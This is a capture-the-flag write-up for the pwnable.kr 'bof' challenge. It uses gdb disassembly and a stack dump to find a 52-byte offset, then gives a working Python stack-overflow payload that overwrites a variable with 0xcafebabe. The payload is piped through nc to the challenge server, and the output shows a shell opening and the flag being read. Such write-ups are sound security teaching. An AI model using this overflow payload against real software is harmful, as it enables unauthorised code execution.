**bof (5 Points)**


Using gdb to check how many A's we need to overflow key.

```diff
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
---Type <return> to continue, or q <return> to quit---
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
End of assembler dump.
(gdb) b *0x00000654
Breakpoint 1 at 0x654
(gdb) r
Starting program: /home/preri/online_course/Exercises/CTF/pwnable/bof/bof 
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x654

(gdb) 
(gdb) d
Delete all breakpoints? (y or n) y
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/preri/online_course/Exercises/CTF/pwnable/bof/bof 
overflow me : 
AAAAA
Nah..
[Inferior 1 (process 6366) exited normally]
(gdb) disas func
(gdb) b *0x56555654
Breakpoint 2 at 0x56555654
(gdb) r
Starting program: /home/preri/online_course/Exercises/CTF/pwnable/bof/bof 
overflow me : 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 2, 0x56555654 in func ()
(gdb) x/40x $esp
0xffffd050:	0xffffd06c	0x00000000	0x00000000	0x7bfae000
0xffffd060:	0x00000009	0xffffd31a	0xf7e024a9	0x41414141
0xffffd070:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd080:	0x41414141	0x41414141	0x41414141	0x7bfae000
0xffffd090:	0x00000000	0xf7e025db	0xffffd0b8	0x5655569f
0xffffd0a0:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
0xffffd0b0:	0xf7faa000	0xf7faa000	0x00000000	0xf7deae81
0xffffd0c0:	0x00000001	0xffffd154	0xffffd15c	0xffffd0e4
0xffffd0d0:	0x00000001	0x00000000	0xf7faa000	0xf7fe575a
0xffffd0e0:	0xf7ffd000	0x00000000	0xf7faa000	0x00000000

```

52 A's will do the trick.
Using cat to redirect stdin for keeping the shell open.

```diff
$ python -c "from struct import pack; print 'A'*52 + pack('<I', 0xcafebabe)" | ./bof
overflow me : 
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
$ python -c "from struct import pack; print 'A'*52 + pack('<I', 0xcafebabe)" | nc pwnable.kr 9000
id
^C
$ (python -c "from struct import pack; print 'A'*52 + pack('<I', 0xcafebabe)"; cat) | nc pwnable.kr 9000
id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
whoami
bof
cat flag
daddy, I just pwned a buFFer :)
^C

```